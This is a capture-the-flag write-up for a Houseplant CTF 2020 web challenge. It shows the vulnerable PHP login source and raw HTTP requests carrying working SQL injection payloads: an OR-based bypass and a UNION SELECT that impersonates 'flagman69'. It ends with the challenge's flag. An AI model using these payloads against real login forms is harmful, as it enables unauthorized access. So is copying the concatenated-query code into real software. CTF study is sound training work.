<h1>Houseplant CTF 2020 â€“ I don't like needles</h1>

<ul>
<li><strong>Category:</strong> web</li>
<li><strong>Points:</strong> 50</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>They make me SQueaL!</p>
  
  <p>http://challs.houseplant.riceteacatpanda.wtf:30001</p>
  
  <p>Dev: Tom</p>
</blockquote>

<h2>Solution</h2>

<p>The name of the challenge seems to be related to SQL injection.</p>

<p>The webpage contains an authentication form. The HTML source contains an interesting comment.</p>

<p>```html
<!DOCTYPE html>
<html>
<head>
    <title>Super secure login portal</title></p>

<pre><code>&lt;style&gt;
    .container {
        position: absolute;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%);
    }

    body {
        font-family: sans-serif;
    }

&lt;/style&gt;
</code></pre>

<p></head>
<body></p>

<pre><code>&lt;div class="container"&gt;
&lt;h1&gt;Super secure login portal&lt;/h1&gt;

&lt;!-- ?sauce --&gt;


&lt;form method="POST"&gt;
    &lt;span&gt;Username: &lt;/span&gt;&lt;input type="text" name="username"&gt;
    &lt;br&gt;
    &lt;br&gt;
    &lt;span&gt;Password: &lt;/span&gt;&lt;input type="password" name="password"&gt;
    &lt;br&gt;
    &lt;br&gt;
    &lt;input type="submit"&gt;
&lt;/form&gt;
&lt;/div&gt;
</code></pre>

<p></body>
</html>
```</p>

<p>Connecting to <code>http://challs.houseplant.riceteacatpanda.wtf:30001/?sauce</code> webpage you can read the source code.</p>

<p>```php
<?php</p>

<pre><code>// error_reporting(0);

if (isset($_GET['sauce'])) {
    show_source("index.php");
    die();
}
</code></pre>

<p>?></p>

<p><!DOCTYPE html>
<html>
<head>
    <title>Super secure login portal</title></p>

<pre><code>&lt;style&gt;
    .container {
        position: absolute;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%);
    }

    body {
        font-family: sans-serif;
    }

&lt;/style&gt;
</code></pre>

<p></head>
<body></p>

<pre><code>&lt;div class="container"&gt;
&lt;h1&gt;Super secure login portal&lt;/h1&gt;

&lt;!-- ?sauce --&gt;

&lt;?php

    if ($_SERVER['REQUEST_METHOD'] == "POST") {

        require("config.php");

        if (isset($_POST["username"]) &amp;&amp; isset($_POST["password"])) {

            $username = $_POST["username"];
            $password = $_POST["password"];

            if (strpos($password, "1") !== false) {
                echo "&lt;p style='color: red;'&gt;Auth fail :(&lt;/p&gt;";
            } else {

                $connection = new mysqli($SQL_HOST, $SQL_USER, $SQL_PASS, $SQL_DB);
                $result = mysqli_query($connection, "SELECT * FROM users WHERE username='" . $username . "' AND password='" . $password . "'", MYSQLI_STORE_RESULT);

                if ($result === false) {
                    echo "&lt;p style='color: red;'&gt;I don't know what you did but it wasn't good.&lt;/p&gt;";
                } else {
                    if ($result-&gt;num_rows != 0) {
                        if (mysqli_fetch_array($result, MYSQLI_ASSOC)["username"] == "flagman69") {
                            echo "&lt;p style='color: green;'&gt;" . $FLAG . " :o&lt;/p&gt;";
                        } else {
                            echo "&lt;p style='color: green;'&gt;Logged in :)&lt;/p&gt;";
                        }
                    } else {
                        echo "&lt;p style='color: red;'&gt;Auth fail :(&lt;/p&gt;";
                    }
                }

            }
        }
    }

?&gt;

&lt;form method="POST"&gt;
    &lt;span&gt;Username: &lt;/span&gt;&lt;input type="text" name="username"&gt;
    &lt;br&gt;
    &lt;br&gt;
    &lt;span&gt;Password: &lt;/span&gt;&lt;input type="password" name="password"&gt;
    &lt;br&gt;
    &lt;br&gt;
    &lt;input type="submit"&gt;
&lt;/form&gt;
&lt;/div&gt;
</code></pre>

<p></body>
</html>
```</p>

<p>Authenticating with username <code>flagman69</code> should print the flag. The query is concatenating strings, so the website is vulnerable to SQL injection.</p>

<p>An additional control is present at the beginning on password value passed: a <code>strpos</code> function is used to check if the password contains the char <code>1</code>.</p>

<p>Trying to bypass the password check with a SQL injection will not print the flag after a correct login, maybe the user is not present.</p>

<p>```
POST / HTTP/1.1
Host: challs.houseplant.riceteacatpanda.wtf:30001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: http://challs.houseplant.riceteacatpanda.wtf:30001
Connection: close
Referer: http://challs.houseplant.riceteacatpanda.wtf:30001/
Upgrade-Insecure-Requests: 1</p>

<p>username=flagman69&amp;password='+OR+'2'='2</p>

<p>HTTP/1.1 200 OK
Date: Fri, 24 Apr 2020 20:55:14 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.30
Vary: Accept-Encoding
Content-Length: 757
Connection: close
Content-Type: text/html; charset=UTF-8</p>

<p><!DOCTYPE html>
<html>
<head>
    <title>Super secure login portal</title></p>

<pre><code>&lt;style&gt;
    .container {
        position: absolute;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%);
    }

    body {
        font-family: sans-serif;
    }

&lt;/style&gt;
</code></pre>

<p></head>
<body></p>

<pre><code>&lt;div class="container"&gt;
&lt;h1&gt;Super secure login portal&lt;/h1&gt;

&lt;!-- ?sauce --&gt;

&lt;p style='color: green;'&gt;Logged in :)&lt;/p&gt;
&lt;form method="POST"&gt;
    &lt;span&gt;Username: &lt;/span&gt;&lt;input type="text" name="username"&gt;
    &lt;br&gt;
    &lt;br&gt;
    &lt;span&gt;Password: &lt;/span&gt;&lt;input type="password" name="password"&gt;
    &lt;br&gt;
    &lt;br&gt;
    &lt;input type="submit"&gt;
&lt;/form&gt;
&lt;/div&gt;
</code></pre>

<p></body>
</html>
```</p>

<p>Using the <code>UNION</code> clause you can discover that the <code>users</code> table has 3 columns and the second returned is the one with <code>username</code>. So the final UNION SQL injection can be crafted passing directly the value to bypass the last check: <code>flagman69</code> username.</p>

<p>```
POST / HTTP/1.1
Host: challs.houseplant.riceteacatpanda.wtf:30001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: http://challs.houseplant.riceteacatpanda.wtf:30001
Connection: close
Referer: http://challs.houseplant.riceteacatpanda.wtf:30001/
Upgrade-Insecure-Requests: 1</p>

<p>username=m3ssap0&amp;password='+UNION+SELECT+2,'flagman69',3+#</p>

<p>HTTP/1.1 200 OK
Date: Fri, 24 Apr 2020 20:57:59 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.30
Vary: Accept-Encoding
Content-Length: 789
Connection: close
Content-Type: text/html; charset=UTF-8</p>

<p><!DOCTYPE html>
<html>
<head>
    <title>Super secure login portal</title></p>

<pre><code>&lt;style&gt;
    .container {
        position: absolute;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%);
    }

    body {
        font-family: sans-serif;
    }

&lt;/style&gt;
</code></pre>

<p></head>
<body></p>

<pre><code>&lt;div class="container"&gt;
&lt;h1&gt;Super secure login portal&lt;/h1&gt;

&lt;!-- ?sauce --&gt;

&lt;p style='color: green;'&gt;rtcp{y0u-kn0w-1-didn't-mean-it-like-th@t} :o&lt;/p&gt;
&lt;form method="POST"&gt;
    &lt;span&gt;Username: &lt;/span&gt;&lt;input type="text" name="username"&gt;
    &lt;br&gt;
    &lt;br&gt;
    &lt;span&gt;Password: &lt;/span&gt;&lt;input type="password" name="password"&gt;
    &lt;br&gt;
    &lt;br&gt;
    &lt;input type="submit"&gt;
&lt;/form&gt;
&lt;/div&gt;
</code></pre>

<p></body>
</html>
```</p>

<p>So the flag is the following.</p>

<p><code>
rtcp{y0u-kn0w-1-didn't-mean-it-like-th@t}
</code></p>
